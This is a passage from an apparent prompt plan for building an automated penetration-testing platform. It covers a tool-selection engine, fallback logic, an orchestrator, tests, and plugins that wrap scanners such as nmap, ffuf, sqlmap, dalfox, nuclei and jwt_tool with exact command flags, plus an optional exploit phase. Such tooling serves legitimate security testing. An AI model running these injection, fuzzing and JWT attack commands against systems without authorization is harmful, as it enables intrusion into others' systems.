    reason: "JWT token detected — testing alg:none and weak secrets"
    
  if context.has_api_endpoints:
    add: corsy, ffuf (api wordlist mode)
    reason: "API endpoints found — enabling CORS and API fuzzing"
    
  if context.has_graphql:
    add: graphw00f
    reason: "GraphQL endpoint detected — running introspection check"
    
  if 445 in context.open_ports:
    add: nmap_smb_scripts
    reason: "Port 445 open — enabling SMB misconfiguration check"
    
  if 3306 in context.open_ports:
    add: nmap_mysql_scripts
    reason: "Port 3306 open — testing MySQL anonymous access"
    
  if 6379 in context.open_ports:
    add: nmap_redis_scripts
    reason: "Redis port open — checking unauthenticated access"
    
  if 9200 in context.open_ports:
    add: nuclei_elasticsearch_templates
    reason: "Elasticsearch port — checking public index exposure"
    
  if any subdomain has takeover_vulnerable flag:
    add: subjack
    
  always add: corsy, tplmap, wapiti (for completeness)

decide_secrets_tools(context: ScanContext) → list[ToolDecision]
  Always returns: [trufflehog, gitleaks, secretfinder, linkfinder]
  
  if context.has_aws_references:
    add: s3scanner
    reason: "AWS references found — scanning for public S3 buckets"
    
  if context.has_github_references:
    add: trufflehog with github mode
    
  always add: cloud_enum

get_fallback_tool(tool_name) → str | None
  Returns the backup tool for each primary tool:
  subfinder → amass
  naabu → rustscan
  rustscan → nmap
  amass → findomain
  sqlmap → nuclei (sqli templates)
  dalfox → nuclei (xss templates)
  wpscan → nuclei (wordpress templates)
  trufflehog → gitleaks
  Return None if no fallback exists

Generate decision_engine.py only. Stop after.
```

---

### Step 2.5 — Fallback Manager

```
PHASE 2 — STEP 5

Generate: backend/orchestrator/fallback_manager.py

Handles all tool failure scenarios automatically.

ToolExecutionRecord dataclass:
  tool_name: str
  task_id: str
  scan_id: str
  started_at: datetime
  result_count: int
  execution_time: float
  error: str | None
  output_quality_score: float

FallbackManager class:

evaluate_result_quality(tool_name, result) → float
  Returns 0.0-1.0 quality score
  Rules:
    result_count == 0 → score 0.1 (very low, likely failed silently)
    execution_time < 2.0 → score 0.2 (too fast, likely errored early)
    result_count > expected_minimum[tool_name] → score 0.9
    otherwise → score 0.5
  
  expected_minimum dict:
    subfinder → 1 result minimum
    naabu → 1 port minimum
    httpx → 1 host minimum
    nuclei → 0 (zero findings is valid)
    sqlmap → 0 (zero findings is valid)

should_fallback(record: ToolExecutionRecord) → bool
  Returns True if:
    record.error is not None
    OR record.output_quality_score < 0.3
    OR record.execution_time > TOOL_TIMEOUT_SECONDS
  Logs decision reason always

handle_failure(record, scan_id, db) → async → str | None
  Gets fallback tool from DecisionEngine.get_fallback_tool()
  If fallback exists:
    Logs: "Tool {tool} failed. Score: {score}. Switching to {fallback}"
    Updates Task record in DB (fallback_tool field)
    Returns fallback tool name
  If no fallback:
    Logs: "Tool {tool} failed. No fallback available. Marking subtask incomplete."
    Updates Task status to FAILED in DB
    Returns None

merge_results(primary_results, fallback_results, tool_category) → list
  Deduplicates and merges results from primary + fallback tools
  Deduplication key depends on category:
    RECON: subdomain name
    PORT: (ip, port, protocol)
    VULN: (title, affected_url)
    SECRET: (secret_type, secret_value)
  Returns merged deduplicated list

Generate fallback_manager.py only. Stop after.
```

---

### Step 2.6 — Orchestrator (Main Controller)

```
PHASE 2 — STEP 6

Generate: backend/orchestrator/orchestrator.py

This is the most important file in the entire project.
It ties everything together.

Orchestrator class:
  Dependencies (injected in __init__):
    event_bus: EventBus
    decision_engine: DecisionEngine
    fallback_manager: FallbackManager
    state_machine: StateMachine
    db_session_factory: async_sessionmaker

Core Methods:

start_scan(scan_id, target, scan_type, config) → async
  Creates scan record in DB with status PENDING
  Publishes ScanStartedEvent
  Dispatches first task to recon_queue:
    task name: "recon.start"
    input: {scan_id, target, tools: decision_engine.decide_recon_tools(target)}
  Updates scan status to RUNNING
  Logs: "Scan {scan_id} started for target {target}"

on_recon_complete(event: ReconCompleteEvent) → async
  Updates scan progress to 20%
  Stores recon results in DB
  Transitions all discovered domains to DISCOVERED state
  Builds ScanContext from recon results
  Gets enum tools from decision_engine.decide_enum_tools()
  Dispatches task to enum_queue
  Logs decision with reason to DB (AuditLog)
  Publishes progress update to WebSocket

on_enum_complete(event: EnumCompleteEvent) → async
  Updates scan progress to 50%
  Stores enum results in DB
  Transitions live hosts to VERIFIED state
  Builds full ScanContext including tech stack, ports, endpoints
  Gets vuln tools from decision_engine.decide_vuln_tools(context)
  Gets secrets tools from decision_engine.decide_secrets_tools(context)
  Dispatches BOTH vuln and secrets tasks simultaneously (parallel)
  Logs all tool selection decisions with reasons
  Updates current_phase in DB to "Vulnerability Assessment"

on_vuln_scan_complete(event: VulnScanCompleteEvent) → async
  Updates DB with finding counts
  Sets vuln_complete flag for this scan in Redis
  Checks if secrets_complete flag also set:
    If both complete: call on_all_phase_complete()
    If not: wait (do nothing, secrets agent will trigger it)

on_secrets_complete(event: SecretsCompleteEvent) → async
  Updates DB with secret counts
  Sets secrets_complete flag in Redis
  Checks if vuln_complete flag also set:
    If both complete: call on_all_phase_complete()
    If not: wait

on_all_phase_complete(scan_id) → async
  Updates scan progress to 90%
  Checks if any CRITICAL findings exist:
    If yes AND exploit_agent enabled in config:
      Dispatches exploit task (conditional)
    Else:
      Dispatches report task directly
  Logs decision

on_tool_failed(event: ToolFailedEvent) → async
  Calls fallback_manager.handle_failure()
  If fallback tool returned:
    Dispatches fallback tool task to same queue
    Logs: "Fallback activated: {primary} → {fallback}"
  Updates AI reasoning panel via WebSocket

on_report_complete(scan_id) → async
  Updates scan status to COMPLETED
  Updates scan progress to 100%
  Updates completed_at timestamp
  Publishes AllCompleteEvent
  Sends notifications (Slack/Telegram/Discord) via httpx
  Logs: "Scan {scan_id} complete"

pause_scan(scan_id) → async
  Sets scan status to PAUSED in DB
  Revokes all pending Celery tasks for this scan_id
  Publishes ScanPausedEvent

resume_scan(scan_id) → async
  Gets last completed phase from DB
  Re-dispatches tasks from next phase
  Sets status back to RUNNING
  Publishes ScanResumedEvent

cancel_scan(scan_id) → async
  Sets scan status to CANCELLED
  Revokes all pending tasks
  Publishes ScanCancelledEvent

log_decision(scan_id, decision, reason, tools_selected) → async
  Writes to AuditLog table in DB
  Format: {timestamp, scan_id, phase, decision, reason, tools_selected}
  This feeds the "AI Reasoning" dashboard panel

Event listener registration:
  On class init, subscribe to EventBus for all event types
  Map each event type to its handler method
  Use asyncio.create_task() for non-blocking handler execution

Generate orchestrator.py only. Stop after.
```

---

### Step 2.7 — Phase 2 Verification

```
PHASE 2 — STEP 7 — FINAL VERIFICATION

Phase 2 is complete. 
Give me a verification test I can run right now.

Write a single Python test file: tests/test_orchestrator.py

Test cases:
1. test_decision_engine_wordpress
   Input: ScanContext with has_wordpress=True
   Expected: wpscan in decided vuln tools
   
2. test_decision_engine_port_445
   Input: ScanContext with open_ports=[445]
   Expected: nmap_smb_scripts in decided tools
   
3. test_fallback_quality_score
   Input: ToolExecutionRecord with result_count=0
   Expected: should_fallback() returns True

4. test_fallback_chain
   Input: tool_name="subfinder"
   Expected: get_fallback_tool() returns "amass"

5. test_state_machine_valid_transition
   Input: domain in NEW state, transition to DISCOVERED
   Expected: success, no exception

6. test_state_machine_invalid_transition
   Input: domain in NEW state, transition to SCANNED
   Expected: raises InvalidStateTransitionError

7. test_event_bus_publish
   Mock Redis, publish ReconCompleteEvent
   Expected: correct channel and payload

Run with: pytest tests/test_orchestrator.py -v

Give me exact command to run this and expected output.
Phase 2 is only complete when all 7 tests pass.
```

---

## Quick Reference

| Phase | Steps | Verify At |
|---|---|---|
| Phase 0 | 0.0 → 0.8 | Step 0.8 only |
| Phase 1 | 1.1 → 1.6 | Step 1.6 only |
| Phase 2 | 2.1 → 2.7 | Step 2.7 only |

# PHASE 3 — PLUGIN MANAGER

---

### Step 3.0 — Phase 3 Master Context

```
PHASE 3 — PLUGIN MANAGER

Phases 0, 1, 2 are complete. All tests passing.
Now building the Plugin Manager — the universal adapter layer
that wraps every security tool into a standard interface.

This phase builds:
1. Base Plugin class (abstract, all plugins inherit this)
2. Plugin Registry (auto-discovers and registers plugins)
3. Plugin Executor (runs plugins, captures output, validates)
4. Plugin Health Checker (verifies tools are installed)
5. All 30+ individual tool plugins

Architecture rules for this phase:
- Orchestrator NEVER calls a tool directly
- Orchestrator ONLY calls: executor.run(plugin_name, params, scan_id)
- Every plugin input is a standardized PluginInput dataclass
- Every plugin output is a standardized PluginOutput dataclass
- No plugin knows about any other plugin
- No plugin writes to database directly
  → Plugin returns PluginOutput → Agent writes to DB
- Every plugin must handle: timeout, crash, empty output gracefully
- Every plugin must have a health_check() method
- Raw tool output always saved (even if parsing fails)
- Parsing failures must never crash the scan

Token rule for this phase:
Generate in this exact order, wait for "next" between each:
  Step 3.1: Base Plugin + Data Contracts
  Step 3.2: Plugin Registry + Executor
  Step 3.3: Plugin Health Checker
  Step 3.4: Recon Plugins (Subfinder, Amass, Assetfinder, 
             Findomain, Chaos, dnsx, whois, ASNmap, crt.sh)
  Step 3.5: Enum Plugins (httpx, Naabu, RustScan, Nmap, 
             WhatWeb, Katana, waybackurls, GAU, ffuf, feroxbuster)
  Step 3.6: Vuln Plugins Batch 1 (Nuclei, SQLMap, dalfox, 
             jwt_tool, corsy, tplmap, subjack, WPScan)
  Step 3.7: Secret + Cloud Plugins (TruffleHog, Gitleaks, 
             SecretFinder, LinkFinder, S3Scanner, Cloud_enum,
             ScrapeGraphAI)
  Step 3.8: Verification
```

---

### Step 3.1 — Base Plugin + Data Contracts

```
PHASE 3 — STEP 1

Generate these 2 files in one response:
backend/plugins/base_plugin.py
backend/plugins/__init__.py

base_plugin.py requirements:

PluginInput dataclass:
  scan_id: str
  target: str
  extra_params: dict (tool-specific parameters)
  timeout: int (seconds, from settings.TOOL_TIMEOUT_SECONDS)
  output_dir: str (where to write raw output files)
  wordlist_path: str | None
  rate_limit: int (requests per second, default 150)

PluginOutput dataclass:
  scan_id: str
  plugin_name: str
  success: bool
  raw_output: str (full stdout + stderr, always captured)
  parsed_data: list[dict] (structured results, empty list if none)
  record_count: int
  execution_time: float (seconds)
  error_message: str | None
  command_executed: str (exact command that was run, for audit)
  output_file_path: str | None (if tool wrote to file)
  quality_score: float (auto-calculated after parse)

PluginMetadata dataclass:
  name: str
  version: str
  category: str (RECON/ENUM/VULN/SECRET/CLOUD/EXPLOIT)
  binary_name: str (e.g. "subfinder", "nmap")
  default_timeout: int
  supports_json_output: bool
  fallback_plugin: str | None
  description: str

AbstractPlugin (ABC):
  Class variables (must define in subclass):
    metadata: PluginMetadata

  Abstract methods (must implement in subclass):
    execute(input: PluginInput) → async → PluginOutput
    parse_output(raw: str) → list[dict]
    health_check() → async → bool
    build_command(input: PluginInput) → list[str]

  Concrete methods (provided in base, do not override):
    run(input: PluginInput) → async → PluginOutput
      Calls build_command()
      Calls _execute_subprocess(command, timeout)
      Calls parse_output() on result
      Calls _calculate_quality_score()
      Returns PluginOutput
      On any exception: returns PluginOutput(success=False, error=str(e))
      NEVER raises exceptions to caller

    _execute_subprocess(command, timeout) → async → tuple[str, str, int]
      Uses asyncio.create_subprocess_exec()
      Returns (stdout, stderr, returncode)
      On timeout: kills process, returns ("", "TIMEOUT", -1)
      Captures both stdout and stderr always

    _calculate_quality_score(output: PluginOutput) → float
      0.0 if not success
      0.1 if success but record_count == 0
      0.5 if success and record_count > 0
      0.9 if success and record_count > expected_minimum
      Always returns float 0.0-1.0

    _save_raw_output(scan_id, plugin_name, raw) → str
      Saves raw output to output_dir/scan_id/plugin_name.txt
      Returns file path
      Creates directories if not exist

    get_binary_path() → str
      Checks settings.TOOL_PATHS for override
      Falls back to shutil.which(metadata.binary_name)
      Raises PluginNotInstalledError if not found

Define exceptions:
  PluginNotInstalledError(Exception)
  PluginTimeoutError(Exception)
  PluginParseError(Exception)

__init__.py: empty, just imports AbstractPlugin for convenience.

Generate both files. Stop after.
```

---

### Step 3.2 — Plugin Registry + Executor

```
PHASE 3 — STEP 2

Generate these 2 files:
backend/plugins/registry.py
backend/plugins/executor.py

registry.py requirements:

PluginRegistry (singleton class):

  _plugins: dict[str, type[AbstractPlugin]] = {}
  _instances: dict[str, AbstractPlugin] = {}

  register(plugin_class: type[AbstractPlugin]) → None
    Decorator-style registration
    Validates plugin_class has metadata defined
    Raises ValueError if name already registered

  get(plugin_name: str) → AbstractPlugin
    Returns singleton instance of plugin
    Creates instance on first call, caches it
    Raises PluginNotFoundError if not registered

  get_all_by_category(category: str) → list[AbstractPlugin]
    Returns all plugins of given category
    Case insensitive match

  list_all() → list[PluginMetadata]
    Returns metadata for all registered plugins
    Used by Tool Management Dashboard API

  auto_discover() → None
    Imports all modules in backend/plugins/ directory
    Skips: base_plugin.py, registry.py, executor.py, __init__.py
    Registration happens via @registry.register decorator
    Call this once on app startup in main.py

  is_registered(plugin_name: str) → bool

PluginNotFoundError(Exception)

executor.py requirements:

PluginExecutor class:

  run(plugin_name, input: PluginInput) → async → PluginOutput
    Gets plugin from registry
    Checks plugin health first (use cached result, TTL 5 minutes)
    If unhealthy: log warning, attempt fallback immediately
    Runs plugin.run(input)
    Publishes ToolStartedEvent before run
    Publishes ToolCompleteEvent or ToolFailedEvent after
    Updates Plugin DB record (total_executions, success_rate, avg_time)
    Returns PluginOutput

  run_many(plugin_names, input: PluginInput) → async → list[PluginOutput]
    Runs multiple plugins sequentially (not parallel)
    Stops if a critical plugin fails (based on category)
    Returns all outputs including failed ones

  run_parallel(plugin_names, inputs: list[PluginInput]) → async → list[PluginOutput]
    Runs multiple plugins in parallel using asyncio.gather()
    Each plugin gets its own PluginInput
    Collects all results regardless of individual failures
    Used for: secrets + cloud running parallel to vuln scan

  _get_cached_health(plugin_name) → bool | None
    Returns cached health check result
    None if cache expired (TTL 5 min)
    Uses Redis for health cache

  update_plugin_stats(plugin_name, output: PluginOutput, db) → async
    Updates Plugin model fields:
      total_executions += 1
      failed_executions += 1 if not output.success
      success_rate = (total - failed) / total
      avg_execution_time = rolling average
      last_health_check = now

Generate both files. Stop after.
```

---

### Step 3.3 — Plugin Health Checker

```
PHASE 3 — STEP 3

Generate: backend/plugins/health_checker.py

HealthChecker class:

check_all() → async → dict[str, bool]
  Runs health_check() on all registered plugins in parallel
  Returns {plugin_name: is_healthy} for all plugins
  Timeout per check: 10 seconds
  Never raises — failed check returns False

check_one(plugin_name) → async → HealthResult
  Runs single plugin health check
  Returns HealthResult dataclass

check_binary_exists(binary_name) → bool
  Uses shutil.which()
  Returns True if binary found in PATH

check_binary_version(binary_name, version_flag="--version") → str | None
  Runs binary with version flag
  Returns version string or None

HealthResult dataclass:
  plugin_name: str
  is_healthy: bool
  binary_found: bool
  version: str | None
  response_time: float
  error: str | None
  checked_at: datetime

get_health_report() → async → list[HealthResult]
  Runs check_all()
  Formats into list of HealthResult
  Used by Tool Management Dashboard API endpoint

startup_health_check() → async → None
  Called once when app starts
  Checks all plugins
  Logs WARNING for each unhealthy tool
  Logs CRITICAL if more than 50% of tools unhealthy
  Does NOT block app startup (degraded mode allowed)
  Updates Plugin.health_status and Plugin.is_installed in DB
  Caches results in Redis with TTL 300 seconds

Generate health_checker.py only. Stop after.
```

---

### Step 3.4 — Recon Plugins

```
PHASE 3 — STEP 4

Generate these 9 plugin files in one response.
All follow the same pattern. Be consistent.
Each must use @registry.register decorator.

Pattern for every plugin:
  1. Define metadata (PluginMetadata)
  2. Implement build_command() → list[str]
  3. Implement parse_output(raw) → list[dict]
  4. Implement health_check() → async → bool
  5. execute() is inherited from AbstractPlugin

─────────────────────────────────────────

FILE: backend/plugins/subfinder.py

metadata:
  name: "subfinder"
  binary_name: "subfinder"
  category: "RECON"
  default_timeout: 120
  supports_json_output: True
  fallback_plugin: "amass"

build_command(input):
  [binary_path, "-d", input.target,
   "-o", output_file, "-json",
   "-silent", "-t", "100",
   "-timeout", str(input.timeout // 10)]

parse_output(raw) → list[dict]:
  Each line is a JSON object: {"host": "api.example.com", "source": [...]}
  Return list of:
  {"subdomain": host, "source": source_list, "tool": "subfinder"}
  Skip malformed lines silently

health_check():
  run subfinder --version, return True if returncode == 0

─────────────────────────────────────────

FILE: backend/plugins/amass.py

metadata:
  name: "amass"
  fallback_plugin: "findomain"
  default_timeout: 300
  supports_json_output: True

build_command(input):
  [binary_path, "enum", "-passive",
   "-d", input.target,
   "-json", output_file,
   "-timeout", "5"]

parse_output(raw):
  Each line is JSON: {"name": "sub.example.com", "sources": [...]}
  Return: {"subdomain": name, "source": sources, "tool": "amass"}

─────────────────────────────────────────

FILE: backend/plugins/assetfinder.py

metadata:
  name: "assetfinder"
  fallback_plugin: "findomain"
  supports_json_output: False

build_command(input):
  [binary_path, "--subs-only", input.target]
  (output is plain text, one subdomain per line)

parse_output(raw):
  Split by newline
  Filter lines containing input.target
  Return: {"subdomain": line.strip(), "tool": "assetfinder"}

─────────────────────────────────────────

FILE: backend/plugins/findomain.py

metadata:
  name: "findomain"
  fallback_plugin: "subfinder"
  supports_json_output: False
  default_timeout: 60

build_command(input):
  [binary_path, "--target", input.target,
   "--output", output_file, "--quiet"]

parse_output(raw):
  Plain text, one subdomain per line
  Return: {"subdomain": line.strip(), "tool": "findomain"}

─────────────────────────────────────────

FILE: backend/plugins/dnsx.py

metadata:
  name: "dnsx"
  category: "RECON"
  supports_json_output: True
  default_timeout: 60

build_command(input):
  input is a file of subdomains (passed via extra_params["input_file"])
  [binary_path, "-l", extra_params["input_file"],
   "-json", "-a", "-aaaa", "-cname", "-mx",
   "-ns", "-txt", "-resp", "-o", output_file]

parse_output(raw):
  Each line is JSON with dns record fields
  Return: {
    "subdomain": record["host"],
    "a_records": record.get("a", []),
    "cname": record.get("cname", []),
    "mx": record.get("mx", []),
    "txt": record.get("txt", []),
    "tool": "dnsx"
  }

─────────────────────────────────────────

FILE: backend/plugins/whois_plugin.py

metadata:
  name: "whois_plugin"
  binary_name: "whois"
  category: "RECON"
  supports_json_output: False
  default_timeout: 30

build_command(input):
  [binary_path, input.target]

parse_output(raw):
  Extract via regex:
    registrar: line starting with "Registrar:"
    creation_date: "Creation Date:"
    expiry_date: "Registry Expiry Date:"
    nameservers: lines starting with "Name Server:"
    org: "Registrant Organization:"
  Return: {
    "domain": target,
    "registrar": ...,
    "creation_date": ...,
    "expiry_date": ...,
    "nameservers": [...],
    "org": ...,
    "tool": "whois"
  }

─────────────────────────────────────────

FILE: backend/plugins/asnmap.py

metadata:
  name: "asnmap"
  binary_name: "asnmap"
  category: "RECON"
  supports_json_output: True
  default_timeout: 30

build_command(input):
  [binary_path, "-d", input.target, "-json", "-silent"]

parse_output(raw):
  Each line JSON: {"asn":"AS12345","org":"Example Inc","cidr":"1.2.3.0/24"}
  Return: {"asn": ..., "org": ..., "cidr": ..., "tool": "asnmap"}

─────────────────────────────────────────

FILE: backend/plugins/crtsh.py

metadata:
  name: "crtsh"
  binary_name: None (HTTP API call, no binary)
  category: "RECON"
  supports_json_output: True
  default_timeout: 30

build_command(input):
  Return [] (no subprocess, uses httpx)

execute(input) → override (do not use subprocess):
  URL = f"https://crt.sh/?q=%.{input.target}&output=json"
  Use httpx.AsyncClient to GET the URL
  Parse JSON response
  Return PluginOutput with parsed certificates

parse_output(raw):
  Parse JSON array from crt.sh
  Extract unique name_value fields
  Filter to subdomains of target
  Return: {"subdomain": name, "issuer": ..., "tool": "crtsh"}

health_check():
  GET https://crt.sh/?q=example.com&output=json
  Return True if status 200

─────────────────────────────────────────

FILE: backend/plugins/theharvester.py

metadata:
  name: "theharvester"
  binary_name: "theHarvester"
  category: "RECON"
  supports_json_output: True
  default_timeout: 120

build_command(input):
  [binary_path, "-d", input.target,
   "-b", "all", "-f", output_file]

parse_output(raw):
  theHarvester outputs JSON when -f flag used
  Extract: emails, hosts, ips
  Return list of:
  {"type": "email"/"host"/"ip", "value": ..., "tool": "theharvester"}

Generate all 9 files. Stop after.
```

---

### Step 3.5 — Enum Plugins

```
PHASE 3 — STEP 5

Generate these 10 plugin files in one response.

─────────────────────────────────────────

FILE: backend/plugins/httpx_plugin.py

metadata:
  name: "httpx_plugin"
  binary_name: "httpx"
  category: "ENUM"
  supports_json_output: True
  default_timeout: 120
  fallback_plugin: None (no fallback for httpx)

build_command(input):
  input_file = extra_params["input_file"] (file of subdomains)
  [binary_path, "-l", input_file,
   "-json", "-status-code", "-title",
   "-tech-detect", "-follow-redirects",
   "-o", output_file, "-threads", "50",
   "-timeout", "10", "-silent"]

parse_output(raw):
  Each line JSON: {
    "url", "status_code", "title", 
    "tech", "host", "port",
    "tls", "redirect_location"
  }
  Return: {
    "url": ..., "subdomain": host, "status_code": ...,
    "title": ..., "technologies": tech list,
    "is_alive": status_code < 500,
    "redirect_url": ..., "tool": "httpx"
  }

─────────────────────────────────────────

FILE: backend/plugins/naabu.py

metadata:
  name: "naabu"
  binary_name: "naabu"
  category: "ENUM"
  supports_json_output: True
  fallback_plugin: "rustscan"
  default_timeout: 300

build_command(input):
  [binary_path, "-host", input.target,
   "-json", "-o", output_file,
   "-top-ports", "1000",
   "-exclude-ports", "80,443",
   "-rate", str(input.rate_limit),
   "-silent", "-timeout", "10"]
  
  If extra_params.get("full_scan"):
    replace -top-ports with -p "-"

parse_output(raw):
  Each line JSON: {"ip":"1.2.3.4","port":22,"protocol":"tcp"}
  Return: {
    "ip": ..., "port": ..., "protocol": ...,
    "is_dangerous": port in DANGEROUS_PORTS list,
    "tool": "naabu"
  }

DANGEROUS_PORTS = [21,22,23,25,53,110,111,135,139,143,
                   161,443,445,512,513,514,1433,1521,
                   2049,3306,3389,5432,5900,6379,8080,
                   8443,9200,27017,50000]

─────────────────────────────────────────

FILE: backend/plugins/rustscan.py

metadata:
  name: "rustscan"
  binary_name: "rustscan"
  category: "ENUM"
  fallback_plugin: "nmap_plugin"
  default_timeout: 120

build_command(input):
  [binary_path, "-a", input.target,
   "--ulimit", "5000", "-b", "1500",
   "--", "-sV", "-oJ", output_file]

parse_output(raw):
  RustScan outputs Nmap JSON when -- flags passed
  Reuse nmap parse logic
  Return same format as naabu for consistency

─────────────────────────────────────────

FILE: backend/plugins/nmap_plugin.py

metadata:
  name: "nmap_plugin"
  binary_name: "nmap"
  category: "ENUM"
  fallback_plugin: None
  default_timeout: 600
  supports_json_output: False (XML output, parse via python-libnmap)

build_command(input):
  ports = extra_params.get("ports", "1-1000")
  [binary_path, "-sV", "-sC",
   "-oX", output_file,
   "-T4", "--open",
   "-p", ports,
   input.target]
  
  If extra_params.get("script"):
    add ["--script", extra_params["script"]]
    (used for SMB, MySQL, Redis scripts)

parse_output(raw):
  Parse XML using xml.etree.ElementTree
  Extract for each host/port:
  {
    "ip": ..., "port": ..., "protocol": ...,
    "state": ..., "service": ..., "version": ...,
    "script_output": ..., "cpe": ...,
    "tool": "nmap"
  }

─────────────────────────────────────────

FILE: backend/plugins/whatweb.py

metadata:
  name: "whatweb"
  binary_name: "whatweb"
  category: "ENUM"
  default_timeout: 60
  supports_json_output: True

build_command(input):
  [binary_path, input.target,
   "--log-json", output_file,
   "--aggression", "1",
   "--quiet"]

parse_output(raw):
  WhatWeb JSON: list of {target, http_status, plugins: {}}
  Extract plugin names and versions from plugins dict
  Return: {
    "url": target,
    "technologies": [
      {"name": plugin_name, "version": version_string}
    ],
    "tool": "whatweb"
  }

─────────────────────────────────────────

FILE: backend/plugins/katana.py

metadata:
  name: "katana"
  binary_name: "katana"
  category: "ENUM"
  default_timeout: 180
  supports_json_output: True

build_command(input):
  [binary_path, "-u", input.target,
   "-json", "-o", output_file,
   "-d", "3",
   "-jc",
   "-fx",
   "-silent",
   "-c", "10",
   "-timeout", "10",
   "-aff"]

parse_output(raw):
  Each line JSON: {
    "timestamp", "request": {"endpoint", "method"},
    "response": {"status_code", "headers"}
  }
  Return: {
    "url": endpoint, "method": method,
    "status_code": ...,
    "is_api": "/api/" in endpoint,
    "has_params": "?" in endpoint,
    "tool": "katana"
  }

─────────────────────────────────────────

FILE: backend/plugins/waybackurls.py

metadata:
  name: "waybackurls"
  binary_name: "waybackurls"
  category: "ENUM"
  supports_json_output: False
  default_timeout: 120

build_command(input):
  [binary_path, input.target]
  (plain text output, one URL per line)

parse_output(raw):
  Split by newline
  Filter empty lines
  Deduplicate
  Return: {"url": line, "source": "wayback", "tool": "waybackurls"}

─────────────────────────────────────────

FILE: backend/plugins/gau.py

metadata:
  name: "gau"
  binary_name: "gau"
  category: "ENUM"
  supports_json_output: False
  fallback_plugin: "waybackurls"
  default_timeout: 120

build_command(input):
  [binary_path, "--providers",
   "wayback,commoncrawl,otx,urlscan",
   "--threads", "5",
   "--o", output_file,
   input.target]

parse_output(raw):
  Plain text, one URL per line
  Return: {"url": line, "source": "gau", "tool": "gau"}

─────────────────────────────────────────

FILE: backend/plugins/ffuf_plugin.py

metadata:
  name: "ffuf_plugin"
  binary_name: "ffuf"
  category: "ENUM"
  supports_json_output: True
  default_timeout: 300

build_command(input):
  wordlist = input.wordlist_path or "/opt/wordlists/common.txt"
  mode = extra_params.get("mode", "directory")
  
  base = [binary_path,
    "-u", f"{input.target}/FUZZ",
    "-w", wordlist,
    "-json", "-o", output_file,
    "-mc", "200,201,204,301,302,307,401,403,405",
    "-t", "40", "-timeout", "10",
    "-r", "-silent"]
  
  if mode == "api":
    replace FUZZ target with api wordlist
  if mode == "vhost":
    add ["-H", "Host: FUZZ.{target}"]

parse_output(raw):
  Parse ffuf JSON output
  Extract results array
  Return: {
    "url": ..., "status": ..., "length": ...,
    "words": ..., "lines": ...,
    "is_interesting": status in [200,201,204,401,403],
    "tool": "ffuf"
  }

─────────────────────────────────────────

FILE: backend/plugins/feroxbuster.py

metadata:
  name: "feroxbuster"
  binary_name: "feroxbuster"
  category: "ENUM"
  supports_json_output: True
  fallback_plugin: "ffuf_plugin"
  default_timeout: 300

build_command(input):
  wordlist = input.wordlist_path or "/opt/wordlists/common.txt"
  [binary_path, "--url", input.target,
   "--wordlist", wordlist,
   "--json", "--output", output_file,
   "--threads", "50",
   "--depth", "3",
   "--status-codes", "200,201,204,301,302,307,401,403",
   "--silent", "--no-state"]

parse_output(raw):
  Each line is JSON: {"type":"response","url":...,"status":...}
  Filter type == "response"
  Return: {
    "url": ..., "status": ..., "size": ...,
    "tool": "feroxbuster"
  }

Generate all 10 files. Stop after.
```

---

### Step 3.6 — Vulnerability Plugins

```
PHASE 3 — STEP 6

Generate these 8 plugin files in one response.

─────────────────────────────────────────

FILE: backend/plugins/nuclei_plugin.py

metadata:
  name: "nuclei_plugin"
  binary_name: "nuclei"
  category: "VULN"
  supports_json_output: True
  default_timeout: 600
  fallback_plugin: None

build_command(input):
  mode = extra_params.get("mode", "full")
  target_file = extra_params.get("target_file", input.target)
  
  base = [binary_path,
    "-json", "-o", output_file,
    "-silent", "-nc",
    "-rate-limit", "100",
    "-bulk-size", "25",
    "-concurrency", "10"]
  
  if mode == "full":
    add ["-target", target_file,
         "-t", "cves,misconfiguration,exposures,
                technologies,vulnerabilities,
                default-logins,file"]
  
  if mode == "cve":
    add ["-t", "cves", "-target", target_file]
    
  if mode == "wordpress":
    add ["-t", "technologies/wordpress",
         "-target", target_file]
    
  if mode == "ssl":
    add ["-t", "ssl", "-target", target_file]

parse_output(raw):
  Each line JSON: {
    "template-id", "info": {"name","severity","description",
    "cvss-score","cve-id","cwe-id","tags"},
    "matched-at", "extracted-results", "request", "response"
  }
  Return: {
    "title": info.name,
    "severity": info.severity.upper(),
    "description": info.description,
    "cvss_score": info.cvss-score,
    "cve_id": info.cve-id,
    "cwe_id": info.cwe-id,
    "owasp_tags": info.tags,
    "affected_url": matched-at,
    "evidence": extracted-results,
    "request": request,
    "response": response[:500],
    "tool": "nuclei"
  }

─────────────────────────────────────────

FILE: backend/plugins/sqlmap_plugin.py

metadata:
  name: "sqlmap_plugin"
  binary_name: "sqlmap"
  category: "VULN"
  supports_json_output: False
  fallback_plugin: "nuclei_plugin" (sqli templates mode)
  default_timeout: 300

build_command(input):
  url = extra_params.get("url", input.target)
  [binary_path, "-u", url,
   "--batch", "--random-agent",
   "--level", "3", "--risk", "2",
   "--output-dir", output_dir,
   "--forms", "--crawl=2",
   "--json-output", output_file,
   "--timeout", "30",
   "--retries", "2"]

parse_output(raw):
  SQLMap output is text-based
  Look for patterns:
    "Type:" → injection type
    "Parameter:" → vulnerable param
    "Title:" → vulnerability title
  Return: {
    "parameter": ..., "injection_type": ...,
    "dbms": ..., "title": ...,
    "severity": "HIGH",
    "tool": "sqlmap"
  }

─────────────────────────────────────────

FILE: backend/plugins/dalfox.py

metadata:
  name: "dalfox"
  binary_name: "dalfox"
  category: "VULN"
  supports_json_output: True
  fallback_plugin: "nuclei_plugin" (xss templates)
  default_timeout: 180

build_command(input):
  url_file = extra_params.get("url_file")
  
  if url_file:
    [binary_path, "file", url_file,
     "--silence", "--json",
     "--output", output_file,
     "--timeout", "10",
     "--worker", "20"]
  else:
    [binary_path, "url", input.target,
     "--silence", "--json",
     "--output", output_file]

parse_output(raw):
  dalfox JSON: list of {
    "type", "inject_type", "poc",
    "evidence", "param", "severity"
  }
  Return: {
    "title": f"XSS in parameter {param}",
    "severity": "HIGH",
    "xss_type": inject_type,
    "poc": poc,
    "evidence": evidence,
    "affected_parameter": param,
    "tool": "dalfox"
  }

─────────────────────────────────────────

FILE: backend/plugins/jwt_tool_plugin.py

metadata:
  name: "jwt_tool_plugin"
  binary_name: "jwt_tool"
  category: "VULN"
  supports_json_output: False
  default_timeout: 60

build_command(input):
  token = extra_params.get("token")
  target_url = extra_params.get("target_url", input.target)
  [binary_path, token,
   "-t", target_url,
   "-M", "at",
   "-v"]

parse_output(raw):
  Text output, scan for:
    "VULNERABLE" keyword → is_vulnerable = True
    "alg:none" → alg_none_vulnerable
    "Weak HMAC secret" → weak_secret
  Return: {
    "title": "JWT Misconfiguration",
